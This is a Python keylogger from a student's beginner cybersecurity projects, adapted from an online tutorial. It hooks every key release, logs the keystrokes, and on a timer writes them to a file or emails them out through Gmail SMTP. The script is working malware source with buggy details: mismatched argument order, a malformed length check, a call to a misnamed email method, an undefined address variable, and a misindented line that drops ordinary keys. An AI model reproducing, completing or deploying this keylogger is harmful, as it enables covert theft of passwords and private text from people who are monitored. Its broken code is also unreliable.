'''
K E N N E T H  M C K R O L A
- - - P A R T  O F  M Y  C Y B E R  S E C  I N T R O  P R O J E C T S - - -
M A R C H  /  A P R I L  2 0 2 1

I.B: https://analyticsindiamag.com/5-cybersecurity-projects-for-beginners/
     https://www.thepythoncode.com/article/write-a-keylogger-python
'''

import sys, keyboard
import smtplib
from threading import Timer
from datetime import datetime

# INITIALIZE GLOBAL PARAMS
# SYSTEM ARGUMENTS : [1] = LOGGING_METHOD  [2] = EMAIL_ADDRESS  [3] = EMAIL_PASSWORD
#   [2] & [3] ARE OPTIONAL IF [1] == "file"

SEND_REPORT_EACH=30
RECEIVING_EMAIL = str(sys.argv[1])
RECEIVING_PASSWORD = str(sys.argv[2])
REPORTING_METHOD = str(sys.argv[3])

if len(sys.argv != 4):
    print("You must pass 3 arguments to the command")
    quit()

class Keylogger:
    def __init__(self, interval, logging_method="file"):
        self.interval = interval
        self.logging_method = logging_method # can be sent to a specified email or saved to a local file

        self.capture_log = ""

        self.start_dt = datetime.now()
        self.end_dt = datetime.now()

    def call(self, event):
        '''Called whenever a keyboard event occurs'''
        name = event.name # name denotes the name of the key being pressed

        if len(name) > 1:
            '''Remove special character instances'''
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
            
            self.capture_log += name

    def update_filename(self):
        '''Identify each filename by it's start and end date times'''
        start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
        end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
        self.filename = f"keylog-{start_dt_str}_{end_dt_str}"

    def report_to_file(self):
        '''Create a file, using the filename variable, and report the capture_log variable feed to it'''
        with open(f"{self.filename}.txt", "w") as f:
            print(self.capture_log, file=f)
        print(f"[+] Saved {self.filename}.txt")

    def sendmail(self, email, password, message):
        server = smtplib.SMTP(host="smtp.gmail.com", port=587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, message)
        server.quit()

    def report(self):
        '''
        resets self.interval and sends keylogs to either
        file or email
        '''

        if self.capture_log:
            self.end_dt = datetime.now()

            self.update_filename()
            if self.logging_method == "email":
                self.sendemail(RECEIVING_ADDRESS, RECEIVING_PASSWORD, self.capture_log)

            elif self.logging_method == "file":
                self.report_to_file()

            print(f"[{self.filename}] - {self.capture_log}") 
            self.start_dt = datetime.now()

        self.capture_log = ""
        timer = Timer(interval=self.interval, function=self.report)
        timer.daemon = True
        timer.start()

    def logging(self):
        self.start_dt = datetime.now()
        keyboard.on_release(callback=self.call)
        self.report()
        keyboard.wait()

if __name__ == "__main__":
    keylogger = Keylogger(interval=SEND_REPORT_EACH, logging_method="file")
    keylogger.logging()